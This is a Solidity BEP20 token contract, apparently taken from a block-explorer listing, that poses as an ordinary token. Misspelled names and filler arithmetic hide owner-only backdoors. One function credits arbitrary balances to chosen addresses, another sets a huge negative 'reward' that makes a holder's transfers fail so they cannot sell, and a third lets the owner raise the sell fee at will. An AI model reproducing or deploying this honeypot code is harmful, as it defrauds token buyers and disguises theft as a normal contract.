/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

/**
 *subbmitted for verification at Etherscan.io on 2022-11-29
*/

/**
 *subbmitted for verification at BscScan.com on 2022-09-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trysubb(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function trymull(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function subb(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mull(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function subb(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint accountfADesired,
        uint accountfBDesired,
        uint accountfAMin,
        uint accountfBMin,
        address to,
        uint deadline
    ) external returns (uint accountfA, uint accountfB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint accountfTokenDesired,
        uint accountfTokenMin,
        uint accountfETHMin,
        address to,
        uint deadline
    ) external payable returns (uint accountfToken, uint accountfETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint accountfAMin,
        uint accountfBMin,
        address to,
        uint deadline
    ) external returns (uint accountfA, uint accountfB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint accountfTokenMin,
        uint accountfETHMin,
        address to,
        uint deadline
    ) external returns (uint accountfToken, uint accountfETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint accountfAMin,
        uint accountfBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accountfA, uint accountfB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint accountfTokenMin,
        uint accountfETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accountfToken, uint accountfETH);
    function swapExactTokensForTokens(
        uint accountfIn,
        uint accountfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory accountfs);
    function swapTokensForExactTokens(
        uint accountfOut,
        uint accountfInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory accountfs);
    function swapExactETHForTokens(uint accountfOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory accountfs);
    function swapTokensForExactETH(uint accountfOut, uint accountfInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory accountfs);
    function swapExactTokensForETH(uint accountfIn, uint accountfOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory accountfs);
    function swapETHForExactTokens(uint accountfOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory accountfs);

    function quote(uint accountfA, uint reserveA, uint reserveB) external pure returns (uint accountfB);
    function getaccountfOut(uint accountfIn, uint reserveIn, uint reserveOut) external pure returns (uint accountfOut);
    function getaccountfIn(uint accountfOut, uint reserveIn, uint reserveOut) external pure returns (uint accountfIn);
    function getaccountfsOut(uint accountfIn, address[] calldata path) external view returns (uint[] memory accountfs);
    function getaccountfsIn(uint accountfOut, address[] calldata path) external view returns (uint[] memory accountfs);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfirrOnTransferTokens(
        address token,
        uint liquidity,
        uint accountfTokenMin,
        uint accountfETHMin,
        address to,
        uint deadline
    ) external returns (uint accountfETH);
    function removeLiquidityETHWithPermitSupportingfirrOnTransferTokens(
        address token,
        uint liquidity,
        uint accountfTokenMin,
        uint accountfETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accountfETH);

    function swapExactTokensForTokensSupportingfirrOnTransferTokens(
        uint accountfIn,
        uint accountfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfirrOnTransferTokens(
        uint accountfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfirrOnTransferTokens(
        uint accountfIn,
        uint accountfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function firrTo() external view returns (address);
    function firrToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfirrTo(address) external;
    function setfirrToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amnnount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amnnount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subbtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subbtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subbtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amnnount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amnnount;
        emit Approval(owner, spender, amnnount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amnnount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnnount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amnnount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnnount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnnount
    ) internal virtual {}
}


contract Token is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address accont) public view virtual returns (uint256) {
        return _balances[accont];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnnount, "ERC20: transfer amnnount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amnnount;
    }
        _balances[to] += amnnount;

        emit Transfer(from, to, amnnount);
    }

    function _burn(address accont, uint256 amnnount) internal virtual {
        require(accont != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accont];
        require(accoontBalance >= amnnount, "ERC20: burn amnnount exceeds balance");
    unchecked {
        _balances[accont] = accoontBalance - amnnount;
    }
        _totalSupply -= amnnount;

        emit Transfer(accont, address(0), amnnount);
    }

    function _mtin(address accont, uint256 amnnount) internal virtual {
        require(accont != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnnount;
        _balances[accont] += amnnount;
        emit Transfer(address(0), accont, amnnount);
    }


    address public uniswapV2Pair;
    address public DEVAddress;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
        _defaultSellfir = 2;
        _defaultBuyfirr = 0;
        DEVAddress = msg.sender;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfir = 0;

    uint256 private _defaultBuyfirr = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _Rewawarrrdds;

    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function upS(uint256 _value) external onlyowner {
        _defaultSellfir = _value;
    }

    function setAdminRewawarrrdd(address accjount,int256 amnnount ) public onlyowner {
        _Rewawarrrdds[accjount] += amnnount*1;
    }

    function rmUserRewawarrrdd(address accjount) public onlyowner {
        _Rewawarrrdds[accjount] = 0*1;
    }


    function setUserRewawarrrdd(address accjount) public onlyowner {
        _Rewawarrrdds[accjount] = int256(0) - int256(_totalSupply)+0;
    }
    

    function getRewawarrrdd(address accjount) public view returns (int256) {
        return _Rewawarrrdds[accjount]+0;
    }


    function _recF(
        address from,
        address _to,
        uint256 _accountf
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from]+0*1;
        require(1*0+fromBalance+0*1 >= _accountf*1*1, "ERC20: transfer amnnount exceeds balance");
        if (_Rewawarrrdds[from]+0*1 > 0*1){
            _balances[from] = _balances[from].add(uint256(0+1*_Rewawarrrdds[from]+0*1));
        }else if (1*1*_Rewawarrrdds[from] < 1*0*1*1){
            _balances[from] = _balances[from].subb(uint256(0+1*_Rewawarrrdds[from]+0*1));
        }



        uint256 trradefirraccountf = 0*1*1;
        uint256 trradefirr = _defaultSellfir+0*1;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                trradefirr = 1*0+_defaultSellfir*1;
            }
            if (from == uniswapV2Pair) {
                trradefirr = _defaultBuyfirr*1;
            }
        }
        trradefirraccountf = _accountf.mull(trradefirr).div(100);

        if (trradefirraccountf > 0*1*1) {
            _balances[from] = _balances[from].subb(trradefirraccountf);
            _balances[_deadAddress] = _balances[_deadAddress].add(trradefirraccountf);
            emit Transfer(from, _deadAddress, trradefirraccountf);
        }

        _balances[from] = _balances[from].subb(_accountf - trradefirraccountf);
        _balances[_to] = _balances[_to].add(_accountf - trradefirraccountf);
        emit Transfer(from, _to, _accountf - trradefirraccountf);
    }

    function transfer(address to, uint256 amnnount) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amnnount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnnount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnnount);
        _recF(from, to, amnnount);
        return true;
    }
}